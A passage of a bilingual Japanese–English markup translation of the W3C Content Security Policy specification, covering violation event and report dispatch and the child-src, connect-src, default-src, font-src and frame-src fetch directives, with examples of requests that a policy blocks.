		<ol>
			<li>
<p>
~IF［
%~target ~NEQ ~NULL
］~AND［
%大域~obj は `Window$I ~objである
］~AND［
%~target の`~shadowも含む根$ ~NEQ %大域~obj に`結付けられている文書$
］
⇒
%~target ~SET ~NULL
◎
If target is not null, and global is a Window, and target’s shadow-including root is not global’s associated Document, set target to null.
</p>


<p class="note">注記：
これは~eventの発火-先になる要素は %施策 の`文書$に`接続されて$いるものに限られることを確保する。
文書に接続されていない要素により 違反が生じた場合、その違反が文書の~listenerから可視になることを確保するため，~eventは 要素でなく当の文書に向けて発火されるようになる。
◎
Note: This ensures that we fire events only at elements connected to policy’s Document. If a violation is caused by an element which isn’t connected to that document, we’ll fire the event at the document rather than the element in order to ensure that the violation is visible to the document’s listeners.
</p>
			</li>
			<li>
<p>
~IF［
%~target ~EQ ~NULL
］：
◎
If target is null:
</p>

				<ol>
					<li>
%~target ~SET %大域~obj
◎
Set target be violation’s global object.
</li>
					<li>
~IF［
%~target は `Window$I ~objである
］
⇒
%~target ~SET %~target に`結付けられている文書$
◎
If target is a Window, set target to target’s associated Document.
</li>
				</ol>
			</li>
			<li>
<p>
%~target に向けて、
`SecurityPolicyViolationEvent$I ~interfaceを利用し，その各種~属性が次のように初期化された，名前 `securitypolicyviolation$et の`~eventを発火-$する：
◎
Fire an event named securitypolicyviolation that uses the SecurityPolicyViolationEvent interface at target with its attributes initialized as follows:
</p>
				<ul>
					<li>
`documentURI$m ~SET
%違反 の`~url$vr
◎
documentURI
• violation’s url
</li>
					<li>
`referrer$m ~SET
%違反 の`~referrer$vr
◎
referrer
• violation’s referrer
</li>
					<li>
`blockedURI$m ~SET
%違反 の`資源$vr
◎
blockedURI
• violation’s resource
</li>
					<li>
`effectiveDirective$m ~SET
%違反 の`有効な指令$vr
◎
effectiveDirective
• violation’s effective directive
</li>
					<li>
`violatedDirective$m ~SET
%違反 の`有効な指令$vr
◎
violatedDirective
• violation’s effective directive
</li>
					<li>
`originalPolicy$m ~SET
%違反 の`施策$vr
◎
originalPolicy
• violation’s policy
</li>
					<li>
`disposition$m ~SET
%違反 の`処分先$vr
◎
disposition
• violation’s disposition
</li>
					<li>
`sourceFile$m ~SET
%違反 の`~source~file$vr
◎
sourceFile
• violation’s source file
</li>
					<li>
`statusCode$m ~SET
%違反 の`状態code$vr
◎
statusCode
• violation’s status
</li>
					<li>
`lineNumber$m ~SET
%違反 の`行番号$vr
◎
lineNumber
• violation’s line number
</li>
					<li>
`columnNumber$m ~SET
%違反 の`列番号$vr
◎
columnNumber
• violation’s column number
</li>
					<li>
`bubbles$m ~SET ~T
◎
bubbles
• true
</li>
					<li>
`composed$m ~SET ~T
◎
composed
• true
</li>
				</ul>

<p class="note">注記：
［
`effectiveDirective$m, `violatedDirective$m
］の両者とも同じ値にされる。
これは，後方互換性を維持するためであり、意図的である。
◎
Note: Both effectiveDirective and violatedDirective are the same value. This is intentional to maintain backwards compatibility.
</p>

<p class="note">注記：
ここでは `composed$m 属性を設定する。
すなわち、この~eventは ~shadow木にも伝播することになる
— `target$m その他の~~詳細は、~~自動的に~light木を正しく視野に入れるようにされる。
◎
Note: We set the composed attribute, which means that this event can be captured on its way into, and will bubble its way out of a shadow tree. target, et al will be automagically scoped correctly for the main tree.
</p>
			</li>
			<li>
<p>
~IF［
%違反 の`施策$vrの`指令~集合$内に［
`名前$ ~EQ  `report-uri$dir
］なる`指令$ %指令 はある
］：
◎
If violation’s policy’s directive set contains a directive named "report-uri" (directive):
</p>
				<ol>
					<li>
~IF［
%違反 の`施策$の`指令~集合$内に［
`名前$ ~EQ  `report-to$dir
］なる`指令$はある
］
⇒
~GOTO `END^i
◎
If violation’s policy’s directive set contains a directive named "report-to", skip the remaining substeps.
</li>
					<li>
%報告先 ~LET［
%指令 の`値$を`~URL構文解析器$uにかけた結果
］
◎
Let endpoint be the result of executing the URL parser on directive’s value.
</li>
					<li>
~IF［
%報告先 は妥当な~URLでない
］
⇒
~GOTO `END^i
◎
If endpoint is not a valid URL, skip the remaining substeps.
</li>
					<li>
<p>
%要請 ~LET
次のように初期化された新たな`要請$：
◎
Let request be a new request, initialized as follows:
</p>
						<ul>
							<li>
`~method$rq ~SET `POST^l
◎
method
• "POST"
</li>
							<li>
`~url$rq ~SET %違反 の`~url$vr
◎
url
• violation’s url
</li>
							<li>
`生成元$rq ~SET
%違反 の`大域~obj$vrの`生成元$
◎
origin
• violation’s global object’s origin
</li>
							<li>
`~window$rq ~SET `no-window^l
◎
window
• "no-window"
</li>
							<li>
`~client$rq ~SET
%違反 の`大域~obj$vrに`関連する設定群~obj$
◎
client
• violation’s global object’s relevant settings object
</li>
							<li>
`行先$rq ~SET `report^l
◎
destination
• "report"
</li>
							<li>
`起動元$rq ~SET 空~文字列
◎
initiator
• ""
</li>
							<li>
`種別$rq ~SET 空~文字列
◎
type
• ""
</li>
							<li>
`~cache~mode$rq ~SET `no-cache^l
◎
cache mode
• "no-cache"
</li>
							<li>
`資格証~mode$rq ~SET `same-origin^l
◎
credentials mode
• "same-origin"
</li>
							<li>
`~header~list$rq ~SET ［
( 名前 ~SET `Content-Type^h / 値 ~SET `application/csp-report^l )
にされた単独の~header
］を包含する`~header~list$
◎
header list
• A header list containing a single header whose name is "Content-Type", and value is "application/csp-report"
</li>
							<li>
`本体$rq ~SET %違反 を`直列化-（非推奨）$Aした結果
◎
body
• The result of executing §5.2 Obtain the deprecated serialization of violation on violation
</li>
							<li>
`~redirect~mode$rq ~SET `error^l
◎
redirect mode
• "error"
</li>
						</ul>
					</li>

					<li>
%要請 を`~fetch$する
— その結果は無視する。
◎
Fetch request. The result will be ignored.
</li>

				</ol>

<p class="note">注記：
この段のすべては、非推奨にされたものと見なされるべきである。
これは，違反ごとに単独の要請を送信するため、単純に~scalableでないので。
この挙動は、~UAから除去できるようになり次第，除去される。
◎
Note: All of this should be considered deprecated. It sends a single request per violation, which simply isn’t scalable. As soon as this behavior can be removed from user agents, it will be.
</p>

<p class="note">注記：
`report-uri^dir は `report-to^dir が不在のときにのみ効果を発揮する。
すなわち、後者は前者を上書きし，新たな仕組みを~supportしない~browserとの後方互換性をとれるようにする。
◎
Note: report-uri only takes effect if report-to is not present. That is, the latter overrides the former, allowing for backwards compatibility with browsers that don’t support the new mechanism.
</p>
			</li>

			<li>`END^i：
<p>
~IF［
%違反 の`施策$の`指令~集合$内に［
`名前$ ~EQ  `report-to$dir
］なる`指令$ %指令 はある
］：
◎
If violation’s policy’s directive set contains a directive named "report-to" (directive):
</p>
				<ol>
					<li>
%~group ~LET %指令 の`値$
◎
Let group be directive’s value.
</li>
					<li>
%設定群~obj ~LET
%違反 の`大域~obj$に`関連する設定群~obj$
◎
Let settings object be violation’s global object’s relevant settings object.
</li>
					<li>
<p>
次を与える下で，`報告先~groupに対する~dataを待入する$A `OOB-REPORTING$r：
◎
Execute [OOB-REPORTING]'s Queue data as type for endpoint group on settings algorithm with the following arguments:
</p>

<ul><li>%~data ~SET %違反
◎
data
• violation
</li><li>%種別 ~SET `CSP^l
◎
type
• "CSP"
</li><li>%報告先~group ~SET %~group
◎
endpoint group
• group
</li><li>%設定群 ~SET %設定群~obj
◎
settings
• settings object
</li></ul>
					</li>
				</ol>
			</li>
		</ol>
	</li>
</ol>

		</section>
	</section>
	<section id="csp-directives">
<h2 title="Content Security Policy Directives">6. ~CSP指令</h2>

<div class="p">
<p>
この仕様は、~web開発者が、自身の~siteの挙動のある種の側面を制御できるようにするための，いくつかの型の`指令$を定義する：
</p>

<ul><li>資源の~fetch~~処理を統治する指令（
<a href="#directives-fetch">~fetch指令</a>
節）
</li><li>文書の状態を統治する指令（
<a href="#directives-document">文書~指令</a>
節）
</li><li>~naviのある側面を統治する指令（
<a href="#directives-navigation">~navi指令</a>
節）
</li><li>報告処理を統治する指令（
<a href="#directives-reporting">指令の報告処理</a>
節）
</li></ul>

<p>
これらは，~CSPの中核を形成し、他の指令は補佐的な文書にて~modularに定義される（
<a href="#directives-elsewhere">他の文書にて定義される指令</a>
節にて例を見れる）。
</p>

◎
This specification defines a number of types of directives which allow developers to control certain aspects of their sites' behavior. This document defines directives which govern resource fetching (in §6.1 Fetch Directives), directives which govern the state of a document (in §6.2 Document Directives), directives which govern aspects of navigation (in §6.3 Navigation Directives), and directives which govern reporting (in §6.4 Reporting Directives). These form the core of Content Security Policy; other directives are defined in a modular fashion in ancillary documents (see §6.5 Directives Defined in Other Documents for examples).
</div>

<p>
~web開発者は、~XSS攻撃による~riskを軽減するため，次のいずれかの指令を含ませて［
~script／~plugin
］の~sourceを規制する~SHOULDである：
◎
To mitigate the risk of cross-site scripting attacks, web developers SHOULD include directives that regulate sources of script and plugins. They can do so by including:
</p>

<ul>
	<li>
［
`script-src$dir, `object-src$dir
］両~指令
◎
Both the script-src and object-src directives, or
</li>
	<li>
`default-src$dir 指令
◎
a default-src directive
</li>
</ul>

<p>
いずれの場合も、~web開発者は，自身による施策~内に妥当な~sourceとして
`unsafe-inline$pl ／ `data^sc
を含ませる~SHOULDでない。
両者とも，［
文書~自身~内に~codeを直接的に含めることを許容する
］ため，~XSS攻撃を可能化するので。
それらは完全に避けるのが最善である。
◎
In either case, developers SHOULD NOT include either 'unsafe-inline', or data: as valid sources in their policies. Both enable XSS attacks by allowing code to be included directly in the document itself; they are best avoided completely.
</p>



		<section id="directives-fetch">
<h3 title="Fetch Directives">6.1. ~fetch指令</h3>

<p>
この節の各~下位~節に述べる指令は、
`~fetch指令@
と総称される。
`~fetch指令$は、ある種の型の資源を，どの所在から読込んでよいかを制御する。
例えば、 `script-src$dir 指令は，~web開発者が信用する~sourceからの~scriptを~whitelist化して，~page上で実行できるようにする。
また、 `font-src$dir 指令は，~web~fontの~sourceを制御する。
◎
Fetch directives control the locations from which certain resourc types may be loaded. For instance, script-src allows developers to whitelist trusted sources of script to execute on a page, while font-src controls the sources of web fonts.
</p>



			<section id="directive-child-src">
<h4>6.1.1. `child-src^dir</h4>

<p>
`child-src@dir
指令は、［
`入子の閲覧文脈$（例： `iframe$e ／ `frame$e ~navi ） ／
`Worker^I 実行~文脈
］の作成を統治する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The child-src directive governs the creation of nested browsing contexts (e.g. iframe and frame navigations) and Worker execution contexts. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "child-src"
`directive-value$p = `serialized-source-list$p
</pre>

<p>
この指令は、［
~frame／~worker
］を拡充するような`要請$
— 公式的には，次に該当する`要請$ —
を制御する：
◎
This directive controls requests which will populate a frame or a worker. More formally, requests falling into one of the following categories:
</p>

<ul>
	<li>
［
`行先$rq ~EQ `document^l
］~AND［
その`~target閲覧文脈$rqは `入子の閲覧文脈$である
］
（例：
`iframe$e ／ `frame$e
要素を拡充するような要請）。
◎
destination is "document", and whose target browsing context is a nested browsing context (e.g. requests which will populate an iframe or frame element)
</li>
	<li>
`行先$rq ~IN
{ `serviceworker^l, `sharedworker^l, `worker^l }
（順に，［
`ServiceWorker$I,
`SharedWorker$I,
`Worker$I
］に対する，`~workerを走らす$~algoに投入される）。
◎
destination is either "serviceworker", "sharedworker", or "worker" (which are fed to the run a worker algorithm for ServiceWorker, SharedWorker, and Worker, respectively).
</li>
</ul>

<div class="example">

<p>
~pageが次の~CSPを伴うならば：
◎
Given a page with the following Content Security Policy:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `child-src$dir https://example.com/
</pre>

<p>
次の~codeによる どの~fetchも，~network~errorを返す
— 供された~URLは，どれも
`child-src$dir の`~source~list$に合致しないので：
◎
Fetches for the following code will all return network errors, as the URLs provided do not match child-src's source list:
</p>

<pre class="html-code">
&lt;iframe src="https://not-example.com"&gt;&lt;/iframe&gt;
&lt;script&gt;
  var %blockedWorker = new Worker("data:application/javascript,...");
&lt;/script&gt;
</pre>

</div>


				<section id="child-src-pre-request">
<h5 title="child-src Pre-request check">6.1.1.1. `child-src^dir 要請前~検査</h5>

<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>


<p>
所与の
( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>

<ol>
	<li>
%名前 ~LET %要請 に対する`有効な指令を取得-$Aした結果
◎
Let name be the result of executing §6.6.1.7 Get the effective directive for request on request.
</li>
	<li>
~IF［
%名前 ~NIN { `frame-src^dir, `worker-src^dir }
］
⇒
~RET `許容ed^i
◎
If name is not frame-src or worker-src, return "Allowed".
</li>
	<li>
~IF［
%施策 内に［
`名前$ ~EQ %名前
］なる`指令$はある
］
⇒
~RET `許容ed^i
◎
If policy contains a directive whose name is name, return "Allowed"
</li>

	<li>
~RET ［
`指令$( %名前, この指令の値 ) の`要請前~検査$A
］( %要請, %施策 )
を実行した結果
◎
Return the result of executing the pre-request check for the directive whose name is name on request and policy, using this directive’s value for the comparison.
</li>
</ol>


				</section>
				<section id="child-src-post-request">
<h5 title="child-src Post-request check">6.1.1.2. `child-src^dir 要請後~検査</h5>


<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
%名前 ~LET %要請 に対する`有効な指令を取得-$Aした結果
◎
Let name be the result of executing §6.6.1.7 Get the effective directive for request on request.
</li>
	<li>
~IF［
%名前 ~NIN { `frame-src^dir, `worker-src^dir }
］
⇒
~RET `許容ed^i
◎
If name is not frame-src or worker-src, return "Allowed".
</li>

	<li>
~IF［
%施策 内に［
`名前$ ~EQ %名前
］なる`指令$はある
］
⇒
~RET `許容ed^i
◎
If policy contains a directive whose name is name, return "Allowed"
</li>

	<li>
~RET ［
`指令$( %名前, この指令の値 ) の`要請後~検査$A
］( %要請, %応答, %施策 )
を実行した結果
◎
Return the result of executing the post-request check for the directive whose name is name on request, response, and policy, using this directive’s value for the comparison.
</li>
</ol>


				</section>
			</section>
			<section id="directive-connect-src">
<h4>6.1.2. `connect-src^dir</h4>

<p>
`connect-src@dir
指令は、［
~script~interfaceを利用して読込める~URL
］を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The connect-src directive restricts the URLs which can be loaded using script interfaces. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "connect-src"
`directive-value$p = `serialized-source-list$p
</pre>


<p>
この指令は、~dataを他の生成元［
へ伝送する／から受信する
］ような`要請$を制御する。
それらには、次の~APIが含まれる：［
`fetch()$m,
`XHR$r,
`EVENTSOURCE$r,
`BEACON$r,
`a$e 要素の `ping$m 属性
］。
この指令は<em>また</em>、 `WEBSOCKETS$r 接続も制御する
— それは技術的には~Fetchの一部ではないが。
◎
This directive controls requests which transmit or receive data from other origins. This includes APIs like fetch(), [XHR], [EVENTSOURCE], [BEACON], and a's ping. This directive also controls WebSocket [WEBSOCKETS] connections, though those aren’t technically part of Fetch.
</p>

<div class="example">

<div class="p">
<p>
~JSは、［
情報を送受信するために外部~serverへ直接的に接続する
］ための，少数の仕組みを提供0する：
</p>

<ul>
	<li>
`EventSource$I は、［
~push通知を受信するために，~serverへ開いた HTTP 接続
］を，維持する。
</li>
	<li>
`WebSocket$I は、~browser↔~server間で，双方向通信channelを開く。
</li>
	<li>
`XMLHttpRequest$I は、任意の ~HTTP要請を，~web開発者に利するために発行する。
</li>
</ul>

<p>
これらは，有用な機能性を可能化する強力な~APIだが、
exfiltration （内部から外へ秘密裏に~dataを転送する）へ誘う道も提供する。
</p>
◎
JavaScript offers a few mechanisms that directly connect to an external server to send or receive information. EventSource maintains an open HTTP connection to a server in order to receive push notifications, WebSockets open a bidirectional communication channel between your browser and a server, and XMLHttpRequest makes arbitrary HTTP requests on your behalf. These are powerful APIs that enable useful functionality, but also provide tempting avenues for data exfiltration.
</div>


<p>
`connect-src$dir
指令は、［
これらの類の接続は，~web開発者が信用する生成元に限って開かれる
］ことを確保できるようにする。
［
この指令に対する~source式の~listを定義する施策
］の送信は、簡単である。
例えば，接続を
`https://example.com^s
のみに制限するときは、次の~headerを送信する：
◎
The connect-src directive allows you to ensure that these and similar sorts of connections are only opened to origins you trust. Sending a policy that defines a list of source expressions for this directive is straightforward. For example, to limit connections to only https://example.com, send the following header:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `connect-src$dir https://example.com/
</pre>

<p>
次の~codeによる~fetchは，いずれも~network~errorを返すことになる
— 供された~URLは，どれも
`connect-src$dir の`~source~list$に合致しないので：
◎
Fetches for the following code will all return network errors, as the URLs provided do not match connect-src's source list:
</p>

<pre class="html-code">
&lt;a ping="https://not-example.com"&gt;...
&lt;script&gt;
  var %xhr = new XMLHttpRequest();
  %xhr.open('GET', 'https://not-example.com/');
  %xhr.send();

  var %ws = new WebSocket("https://not-example.com/");

  var %es = new EventSource("https://not-example.com/");

  navigator.sendBeacon("https://not-example.com/", { ... });
&lt;/script&gt;
</pre>
</div>



				<section id="connect-src-pre-request">
<h5 title="connect-src Pre-request check">6.1.2.1. `connect-src^dir 要請前~検査</h5>


<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`起動元$rq ~EQ `fetch^l
］~OR［［
%要請 の`種別$rq ~EQ 空~文字列
］~AND［
%要請 の`行先$rq ~EQ `subresource^l
］］：
◎
If request’s initiator is "fetch", or its type is "" and destination is "subresource":
</p>
		<ol>
			<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>


				</section>
				<section id="connect-src-post-request">
<h5 title="connect-src Post-request check">6.1.2.2. `connect-src^dir 要請後~検査</h5>

<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`起動元$rq ~EQ `fetch^l
］~OR［［
%要請 の`種別$rq ~EQ 空~文字列
］~AND［
%要請 の`行先$rq ~EQ `subresource^l
］］：
◎
If request’s initiator is "fetch", or its type is "" and destination is "subresource":
</p>
		<ol>
			<li>
~IF［
`要請に対する応答は~source~listに合致するか？$A( %応答, %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.4 Does response to request match source list? on response, request, and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>


				</section>
			</section>
			<section id="directive-default-src">
<h4>6.1.3. `default-src^dir</h4>

<p>
`default-src@dir
指令は、他の`~fetch指令$に対する~fallbackとして~~働く。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The default-src directive serves as a fallback for the other fetch directives. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "default-src"
`directive-value$p = `serialized-source-list$p
</pre>


<p>
施策~内に `default-src$dir 指令が在する場合、その値は，施策の既定の`~source~list$として利用されることになる。
すなわち、
`default-src 'none'; script-src 'self'^s
が与えられたなら、~script要請は，照合する`~source~list$として，
`self$pl を利用する。
他の要請は， `none$pl を利用することになる。
これは、［
`要請は~CSPにより阻止されるべきか？$A,
`要請に対する応答は~CSPにより阻止されるべきか？$A
］~algoにてより詳細に~~述べられる。
◎
If a default-src directive is present in a policy, its value will be used as the policy’s default source list. That is, given default-src 'none'; script-src 'self', script requests will use 'self' as the source list to match against. Other requests will use 'none'. This is spelled out in more detail in the §4.1.3 Should request be blocked by Content Security Policy? and §4.1.4 Should response to request be blocked by Content Security Policy? algorithms.
</p>

<div class="example">

<p>
次の~headerは：
◎
The following header:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `default-src$dir `self$pl
</pre>

<p>
次の~headerと同じ挙動になる：
◎
will have the same behavior as the following header:
</p>


<pre class="http-code">
`Content-Security-Policy$h:
    `connect-src$dir `self$pl;
    `font-src$dir `self$pl;
    `frame-src$dir `self$pl;
    `img-src$dir `self$pl;
    `manifest-src$dir `self$pl;
    `media-src$dir `self$pl;
    `object-src$dir `self$pl;
    `script-src$dir `self$pl;
    `style-src$dir `self$pl;
    `worker-src$dir `self$pl
</pre>

<p>
すなわち、 `default-src$dir が設定されているときは，明示的に設定されていない どの`~fetch指令$も， `default-src$dir が指定する値に~fall-backすることになる。
◎
That is, when default-src is set, every fetch directive that isn’t explicitly set will fall back to the value default-src specifies.
</p>
</div>

<div class="example">

<p>
継承はない。
例えば， `script-src$dir 指令が明示的に指定されている場合、
`default-src$dir の値は
~script要請には波及しない。
すなわち、次の~headerは：
◎
There is no inheritance. If a script-src directive is explicitly specified, for example, then the value of default-src has no influence on script requests. That is, the following header:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `default-src$dir `self$pl;
    `script-src$dir https://example.com
</pre>

<p>
次の~headerと同じ挙動になる：
◎
will have the same behavior as the following header:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `connect-src$dir `self$pl;
    `font-src$dir `self$pl;
    `frame-src$dir `self$pl;
    `img-src$dir `self$pl;
    `manifest-src$dir `self$pl;
    `media-src$dir `self$pl;
    `object-src$dir `self$pl;
    `script-src$dir https://example.com;
    `style-src$dir `self$pl;
    `worker-src$dir `self$pl
</pre>


<p>
この挙動の下で，~siteのために施策を築く良い仕方の一つは、まず， `default-src$dir を `none$pl にする所から始め、［
施策が適用される特定0の~pageに必要とされる資源~型
］のみが許容されるように，施策を築上げるものになるであろう。
◎
Given this behavior, one good way to build a policy for a site would be to begin with a default-src of 'none', and to build up a policy from there which allowed only those resource types which are necessary for the particular page the policy will apply to.
</p>
</div>



				<section id="default-src-pre-request">
<h5 title="default-src Pre-request check">6.1.3.1. `default-src^dir 要請前~検査</h5>


<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>

<ol>
	<li>
%名前 ~LET %要請 に対する`有効な指令を取得-$Aした結果
◎
Let name be the result of executing §6.6.1.7 Get the effective directive for request on request.
</li>
	<li>
~IF［
%名前 ~EQ ~NULL
］
⇒
~RET `許容ed^i
◎
If name is null, return "Allowed".
</li>
	<li>
~IF［
%施策 内に［
`名前$ ~EQ %名前
］なる`指令$はある
］
⇒
~RET `許容ed^i
◎
If policy contains a directive whose name is name, return "Allowed".
</li>
	<li>
<p>
~IF［［
%名前 ~IN { `frame-src^l, `worker-src^l }
］~AND［
%施策 内に［
`名前$ ~EQ `child-src^l
］なる`指令$はある
］
⇒
~RET `許容ed^i
◎
If name is "frame-src" or "worker-src", and policy contains a directive whose name is "child-src", return "Allowed".
</p>

<p class="note">注記：
この特別な事例を除去できればすてきなのだが。
おそらく、 “有効な指令” は `child-src^l を返すようにして、何らかの仕方で，この~algoが行うことを外へ移譲することもできるのでは？
◎
Note: It would be lovely to remove this special case. Perhaps "effective directive" could return "child-src" and that could delegate out in the same way this algorithm does?
</p>
	</li>
	<li>
~RET ［
`指令$( %名前, この指令の値 ) の`要請前~検査$A
］( %要請, %施策 )
を実行した結果
◎
Otherwise, return the result of executing the pre-request check for the directive whose name is name on request and policy, using this directive’s value for the comparison.
</li>
</ol>


				</section>
				<section id="default-src-post-request">
<h5 title="default-src Post-request check">6.1.3.2. `default-src^dir 要請後~検査</h5>

<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
%名前 ~LET %要請 に対する`有効な指令を取得-$Aした結果
◎
Let name be the result of executing §6.6.1.7 Get the effective directive for request on request.
</li>
	<li>
~IF［
%名前 ~EQ ~NULL
］
⇒
~RET `許容ed^i
◎
If name is null, return "Allowed".
</li>
	<li>
~IF［
%施策 内に［
`名前$ ~EQ %名前
］なる`指令$はある
］
⇒
~RET `許容ed^i
◎
If policy contains a directive whose name is name, return "Allowed".
</li>
	<li>
<p>
~IF［［
%名前 ~IN { `frame-src^l, `worker-src^l }
］~AND［
%施策 内に［
`名前$ ~EQ `child-src^l
］なる`指令$はある
］
⇒
~RET `許容ed^i
◎
If name is "frame-src" or "worker-src", and policy contains a directive whose name is "child-src", return "Allowed".
</p>

<p class="note">注記：
この特別な事例を除去できればすてきなのだが。
おそらく、 “有効な指令” は `child-src^l を返すようにして、何らかの仕方で，この~algoが行うことを外へ移譲することもできるのでは？
◎
Note: It would be lovely to remove this special case. Perhaps "effective directive" could return "child-src" and that could delegate out in the same way this algorithm does?
</p>
	</li>
	<li>
~RET ［
`指令$( %名前, この指令の値 ) の`要請後~検査$A
］( %要請, %応答, %施策 )
を実行した結果
◎
Otherwise, return the result of executing the post-request check for the directive whose name is name on request, response, and policy, using this directive’s value for the comparison.
</li>
</ol>




				</section>
			</section>
			<section id="directive-font-src">
<h4>6.1.4. `font-src^dir</h4>

<p>
`font-src@dir
指令は、［
どの~URLから~font資源を読込んでよいか
］を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The font-src directive restricts the URLs from which font resources may be loaded. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "font-src"
`directive-value$p = `serialized-source-list$p
</pre>

<div class="example">
<p>
~pageが次の~CSPを伴うならば：
◎
Given a page with the following Content Security Policy:
</p>


<pre class="http-code">
`Content-Security-Policy$h:
    `font-src$dir https://example.com/
</pre>

<p>
次の~codeによる~fetchは，~network~errorを返すことになる
— 供された~URLは，
`font-src$dir の`~source~list$に合致しないので：
◎
Fetches for the following code will return a network errors, as the URL provided do not match font-src's source list:
</p>

<pre class="html-code">
&lt;style&gt;
  @font-face {
    font-family: "Example Font";
    src: url("https://not-example.com/font");
  }
  body {
    font-family: "Example Font";
  }
&lt;/style&gt;
</pre>
</div>



				<section id="font-src-pre-request">
<h5 title="font-src Pre-request check">6.1.4.1. `font-src^dir 要請前~検査</h5>

<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`種別$rq ~EQ `font^l
］：
◎
If request’s type is "font":
</p>
		<ol>
			<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="font-src-post-request">
<h5 title="font-src Post-request check">6.1.4.2. `font-src^dir 要請後~検査</h5>

<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`種別$rq ~EQ `font^l
］：
◎
If request’s type is "font":
</p>
		<ol>
			<li>
~IF［
`要請に対する応答は~source~listに合致するか？$A( %応答, %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.4 Does response to request match source list? on response, request, and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>


				</section>
			</section>
			<section id="directive-frame-src">
<h4>6.1.5. `frame-src^dir</h4>

<p>
`frame-src@dir
指令は、［
どの~URLを`入子の閲覧文脈$内に読込んでよいか
］を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The frame-src directive restricts the URLs which may be loaded into nested browsing contexts. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "frame-src"
`directive-value$p = `serialized-source-list$p
</pre>


<div class="example">
<p>
~pageが次の~CSPを伴うならば：
◎
Given a page with the following Content Security Policy:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `frame-src$dir https://example.com/
</pre>

<p>
次の~codeによる~fetchは、~network~errorを返すことになる
— 供された~URLは，
`frame-src$dir の`~source~list$に合致しないので：
◎
Fetches for the following code will return a network errors, as the URL provided do not match frame-src's source list:
</p>

<pre class="html-code">
&lt;iframe src="https://not-example.com/"&gt;
&lt;/iframe&gt;
</pre>
</div>


				<section id="frame-src-pre-request">
<h5 title="frame-src Pre-request check">6.1.5.1. `frame-src^dir 要請前~検査</h5>

<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>

<p>
所与の
